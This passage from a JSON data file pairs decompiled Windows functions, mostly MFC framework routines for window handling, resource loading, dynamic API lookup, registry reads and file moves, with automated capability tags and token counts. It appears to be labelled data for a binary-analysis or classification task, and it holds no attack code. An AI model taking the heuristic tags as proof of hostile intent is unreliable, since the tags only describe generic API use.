        "decompiled_code": "\nvoid __cdecl fcn.004376ee(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_8h;\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &arg_8h);\n    if (*piVar2 != 0) {\n        *arg_10h = -1;\n    }\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    arg_ch = 0;\n    while( true ) {\n        uVar3 = (*pcVar1)(arg_8h, 0x87, 0, 0);\n        if ((uVar3 & 0x40) != 0) {\n            if (*piVar2 == 0) {\n                (*pcVar1)(arg_8h, 0xf1, arg_ch == *arg_10h, 0);\n            }\n            else {\n                iVar4 = (*pcVar1)(arg_8h, 0xf0, 0, 0);\n                if (iVar4 != 0) {\n                    *arg_10h = arg_ch;\n                }\n            }\n            arg_ch = arg_ch + 1;\n        }\n        arg_8h = (*_sym.imp.USER32.dll_GetWindow)(arg_8h, 2);\n        if (arg_8h == NULL) break;\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_8h, 0xfffffff0);\n        if ((uVar3 & 0x20000) != 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "00438561": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00438561(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x00438590;\n    iVar3 = fcn.00438528();\n    if ((iVar3 == 0) && (iVar3 = fcn.0040a3cd(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar5 = iVar3;\n        iVar6 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x1c); iVar5 = iVar3,  iVar6 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x00438590:\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar5 = iVar3;\n            iVar6 = iVar3;\n            if ((uVar4 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar5,  iVar1 != 0) {\n        iVar5 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar6 != 0)) {\n        iVar6 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar6);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar5 == 0)) || (iVar3 == iVar6))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 482
    },
    "0043d286": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043d286(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint lpMsg;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetCapture;\n    iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar2 == 0) {\n        uVar3 = (*_sym.imp.USER32.dll_SetCapture)(*(*(param_1 + 0x68) + 0x1c));\n        fcn.0042b432(uVar3);\n        uVar3 = (*pcVar1)();\n        iVar2 = fcn.0042b432(uVar3);\n        if (iVar2 == *(param_1 + 0x68)) {\n            do {\n                uVar4 = 0;\n                uVar3 = 0;\n                iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n                if (iVar2 == 0) {\n                    fcn.0044aa55(uVar4, var_14h);\n                    break;\n                }\n                if (var_18h == 0x100) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.0043cf69(uVar3, 1, var_14h);\n                    }\n                    if (var_14h == 0x1b) break;\n                }\n                else if (var_18h == 0x101) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.0043cf69(uVar3, 0, var_14h);\n                    }\n                }\n                else if (var_18h == 0x200) {\n                    if (*(param_1 + 0x88) == 0) {\n                        fcn.0043cf9d(var_8h, var_4h);\n                    }\n                    else {\n                        fcn.0043ceea(var_8h, var_4h);\n                    }\n                }\n                else {\n                    if (var_18h == 0x202) {\n                        if (*(param_1 + 0x88) == 0) {\n                            fcn.0043d242();\n                        }\n                        else {\n                            fcn.0043d13f();\n                        }\n                        return 1;\n                    }\n                    if (var_18h == 0x204) break;\n                    (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n                }\n                uVar3 = (*pcVar1)();\n                iVar2 = fcn.0042b432(uVar3);\n            } while (iVar2 == *(param_1 + 0x68));\n        }\n        fcn.0043d0fa();\n    }\n    return 0;\n}\n",
        "token_count": 654
    },
    "0043dafc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0043dafc(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    iVar2 = 0;\n    if (0 < *(param_1 + 0x9c)) {\n        do {\n            if ((iVar2 != param_3) && (piVar1 = fcn.0041052d(iVar2),  *piVar1 == unaff_retaddr)) {\n                return iVar2;\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(param_1 + 0x9c));\n    }\n    return -1;\n}\n",
        "token_count": 169
    },
    "0043de11": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043de11(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    if (0 < *(param_1 + 0x9c)) {\n        do {\n            iVar1 = fcn.0043db39();\n            if (iVar1 != 0) {\n                iVar2 = iVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *(param_1 + 0x9c));\n    }\n    return iVar2;\n}\n",
        "token_count": 147
    },
    "0043e4a1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e4a1(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = 0;\n    if (0 < *(param_1 + 0x9c)) {\n        do {\n            arg_8h = fcn.0043db39(iVar1);\n            if (arg_8h != 0) {\n                fcn.0043fbce();\n                fcn.00440706(arg_8h, unaff_retaddr, 1);\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(param_1 + 0x9c));\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0043f7c2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0043f7c2(int32_t param_1, int32_t param_2)\n\n{\n    do {\n        if (param_1 == param_2) {\n            return 1;\n        }\n        param_2 = fcn.0042c658();\n    } while (param_2 != 0);\n    return 0;\n}\n",
        "token_count": 78
    },
    "00441676": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00441676(void)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFrameWnd.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.004413a3();\n    iVar3 = fcn.00444bc2();\n    ppcVar1 = *(iVar3 + 0xec);\n    while (ppcVar1 == extraout_ECX) {\n        puVar2 = *(iVar3 + 0xf0);\n        *(puVar2[1] + 0xec) = *puVar2;\n        *(puVar2[1] + 0xf0) = puVar2[2];\n        puVar2[1] = 0;\n        ppcVar1 = *(iVar3 + 0xec);\n    }\n    if (extraout_ECX[0x2e] != NULL) {\n        fcn.0042eae6(extraout_ECX[0x2e]);\n    }\n    fcn.00401200();\n    *(unaff_EBP + -4) = 0;\n    fcn.0042705e();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042bd92();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 392
    },
    "004434de": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004434de(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0;\n        do {\n            if ((*(iVar1 * 8 + 0x45560c) & 0xf000) == (*(arg_8h + 0x7c) & 0xf000)) {\n                fcn.00440bd3(*(iVar1 * 8 + 0x455608));\n                break;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < 4);\n    }\n    fcn.0043e54f(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 180
    },
    "00446259": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00446259(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_1;\n    uVar3 = 0;\n    if (iVar4 != 0) {\n        if (iVar4 == param_2) {\n            *param_1 = *(param_2 + param_1[1]);\n        }\n        else {\n            iVar1 = param_1[1];\n            do {\n                iVar2 = *(iVar1 + iVar4);\n                if (iVar2 == param_2) break;\n                iVar4 = iVar2;\n            } while (iVar2 != 0);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            *(iVar1 + iVar4) = *(iVar1 + param_2);\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 221
    },
    "0044630c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044630c(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    if ((0 < arg_8h) && (arg_8h < *(in_ECX + 0xc))) {\n        for (iVar3 = *(in_ECX + 0x14); iVar3 != 0; iVar3 = *(iVar3 + 4)) {\n            if (arg_8h < *(iVar3 + 8)) {\n                puVar2 = *(*(iVar3 + 0xc) + arg_8h * 4);\n                if (puVar2 != NULL) {\n                    (***puVar2)(1);\n                }\n                *(*(iVar3 + 0xc) + arg_8h * 4) = 0;\n            }\n        }\n        puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n        *puVar1 = *puVar1 & 0xfffffffe;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "00428d6d": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00428d6d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint noname_4;\n    uint uVar2;\n    uint in_ECX;\n    uint unaff_EBX;\n    uint noname_0;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint noname_3;\n    uint noname_5;\n    uint noname_6;\n    uint noname_7;\n    uint var_4h;\n    \n    noname_0 = 0;\n    iVar1 = fcn.00444bf8();\n    uVar2 = *(iVar1 + 0xc);\n    noname_7 = 5;\n    noname_5 = uVar2;\n    noname_6 = arg_8h;\n    noname_4 = (*_sym.imp.KERNEL32.dll_FindResourceA)();\n    noname_3 = uVar2;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)();\n    if (iVar1 != 0) {\n        noname_0 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    }\n    uVar2 = fcn.004289b8(noname_0, arg_ch, uVar2, noname_3, noname_4, noname_5, noname_6, noname_7, unaff_EDI, unaff_ESI\n                         , unaff_EBX, in_ECX, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                         in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c);\n    (*_sym.imp.KERNEL32.dll_FreeResource)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 479
    },
    "00428dc3": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.00428dc3(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(param_1);\n    fcn.00428d42(uVar1, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 75
    },
    "0042d860": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.0042d860(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        iVar1 = fcn.00444bf8();\n        uVar2 = *(iVar1 + 0xc);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar2, param_1, 0xf0);\n        if (iVar1 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, iVar1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            arg_8h = (*_sym.imp.KERNEL32.dll_LockResource)(iVar3);\n        }\n    }\n    uVar2 = fcn.0042c9c5(arg_8h);\n    if ((arg_8h != 0) && (iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 265
    },
    "00402880": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00402880(uint *param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    fcn.004284fa(param_2, param_3);\n    *param_1 = 0x44e5d8;\n    param_1[0x1c] = 0;\n    param_1[0x1d] = 3;\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n    *0x464fe0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"SetLayeredWindowAttributes\");\n    return param_1;\n}\n",
        "token_count": 153
    },
    "0040aba0": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.0040aba0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x466bd4 != 0) {\n        return *0x466bc8 != 0;\n    }\n    *0x466bd8 = fcn.0040ab53();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (((((iVar2 != 0) && (*0x466bb8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x45036c),  *0x466bb8 != 0)) &&\n         (*0x466bbc = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x466bbc != 0)) &&\n        ((*0x466bc0 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x466bc0 != 0 &&\n         (*0x466bc4 = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x466bc4 != 0)))) &&\n       ((*0x466bcc = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x466bcc != 0 &&\n        ((*0x466bc8 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x466bc8 != 0 &&\n         (*0x466bd0 = (*pcVar1)(iVar2, \"EnumDisplayDevicesA\"),  *0x466bd0 != 0)))))) {\n        *0x466bd4 = 1;\n        return true;\n    }\n    *0x466bb8 = 0;\n    *0x466bbc = 0;\n    *0x466bc0 = 0;\n    *0x466bc4 = 0;\n    *0x466bc8 = 0;\n    *0x466bcc = 0;\n    *0x466bd0 = 0;\n    *0x466bd4 = 1;\n    return false;\n}\n",
        "token_count": 459
    },
    "0041221f": {
        "rules": [
            "link function at runtime on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.0041221f(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_retaddr);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(unaff_retaddr);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 153
    },
    "0042a50d": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint32_t fcn.0042a50d(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t unaff_ESI;\n    uint32_t uVar5;\n    uint unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"COMCTL32.DLL\");\n    uVar5 = uVar2;\n    if (uVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x450750);\n        uVar5 = 0;\n        if (pcVar3 == NULL) {\n            if ((unaff_ESI & 0x3fc0) == unaff_ESI) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = 0x3fc0;\n            }\n        }\n        else {\n            iVar4 = (*pcVar3)(unaff_EDI);\n            if ((iVar4 != 0) && (uVar5 = unaff_ESI,  iVar1 == 0)) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = unaff_ESI | 0x3fc0;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 334
    },
    "00432f14": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00432f14(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"GetLayout\");\n    if (pcVar2 == NULL) {\n        uVar1 = 0xffffffff;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n    }\n    else {\n        uVar1 = (*pcVar2)(*(param_1 + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 148
    },
    "00432f4a": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00432f4a(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t unaff_EDI;\n    uint uVar3;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    uVar3 = 0;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"SetLayout\");\n    if (pcVar2 == NULL) {\n        if (unaff_EDI != 0) {\n            uVar3 = 0xffffffff;\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n        }\n    }\n    else {\n        uVar3 = (*pcVar2)(*(param_1 + 4), unaff_EDI);\n    }\n    return uVar3;\n}\n",
        "token_count": 191
    },
    "004469b3": {
        "rules": [
            "query or enumerate registry value",
            "read .ini file"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004469b3(uint arg_8h, uint lpAppName, uint lpKeyName, uint lpDefault)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1020h;\n    uint var_101ch;\n    uint var_1018h;\n    uint hKey;\n    uint lpReturnedString;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    fcn.004112a0();\n    uVar4 = *0x4640c8;\n    *(unaff_EBP + -0x101c) = 0;\n    iVar2 = *(extraout_ECX + 0x50);\n    *(unaff_EBP + -0x10) = uVar4;\n    if (iVar2 == 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            *(unaff_EBP + 0x14) = 0x44da68;\n        }\n        (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringA)\n                  (*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), unaff_EBP + -0x1010, 0x1000, \n                   *(extraout_ECX + 100));\n        var_ch = unaff_EBP + -0x1010;\n    }\n    else {\n        iVar2 = fcn.00446904(*(unaff_EBP + 0xc));\n        *(unaff_EBP + -0x1014) = iVar2;\n        if (iVar2 != 0) {\n            piVar3 = fcn.004290ee();\n            iVar2 = (**(*piVar3 + 0xc))();\n            *(unaff_EBP + 0xc) = iVar2 + 0x10;\n            pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n            *(unaff_EBP + -4) = 0;\n            iVar2 = (*pcVar1)(*(unaff_EBP + -0x1014), *(unaff_EBP + 0x10), 0, unaff_EBP + -0x101c, 0, \n                              unaff_EBP + -0x1020);\n            *(unaff_EBP + -0x1018) = iVar2;\n            if (iVar2 == 0) {\n                uVar4 = fcn.004019c0(*(unaff_EBP + -0x1020), unaff_EBP + -0x1020);\n                uVar4 = (*pcVar1)(*(unaff_EBP + -0x1014), *(unaff_EBP + 0x10), 0, unaff_EBP + -0x101c, uVar4);\n                *(unaff_EBP + -0x1018) = uVar4;\n                fcn.004059a0(0xffffffff);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(unaff_EBP + -0x1014));\n            if (*(unaff_EBP + -0x1018) == 0) {\n                fcn.004019a0(unaff_EBP + 0xc);\n            }\n            else {\n                fcn.00401ce0(*(unaff_EBP + 0x14));\n            }\n            fcn.00401200();\n            goto code_r0x00446ae7;\n        }\n        var_ch = *(unaff_EBP + 0x14);\n    }\n    fcn.00401ce0(var_ch);\ncode_r0x00446ae7:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 921
    },
    "0041ea89": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ea89(uint Locale)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    uchar var_6h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    var_6h = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 0x1004, &lpLCData, 6);\n    if (iVar1 != 0) {\n        fcn.004127bc(&lpLCData);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 136
    },
    "004448b7": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004448b7(code **param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    *param_1 = vtable._AFX_THREAD_STATE.0;\n    if (param_1[0xb] != NULL) {\n        (*pcVar1)(param_1[0xb]);\n    }\n    if (param_1[10] != NULL) {\n        (*pcVar1)(param_1[10]);\n    }\n    if (param_1[3] != NULL) {\n        fcn.00411031(param_1[3]);\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00431330": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nvoid fcn.00431330(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileA)(param_1, param_2);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(param_2);\n        fcn.004323b3(uVar2);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00431355": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nvoid fcn.00431355(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(param_1);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(unaff_retaddr);\n        fcn.004323b3(uVar2);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0044610c": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044610c(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if ((0 < unaff_retaddr) && (unaff_retaddr < param_1[3])) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if ((iVar1 != 0) && (unaff_retaddr < *(iVar1 + 8))) {\n            uVar2 = *(*(iVar1 + 0xc) + unaff_retaddr * 4);\n            goto code_r0x00446143;\n        }\n    }\n    uVar2 = 0;\ncode_r0x00446143:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return uVar2;\n}\n",
        "token_count": 208
    }
}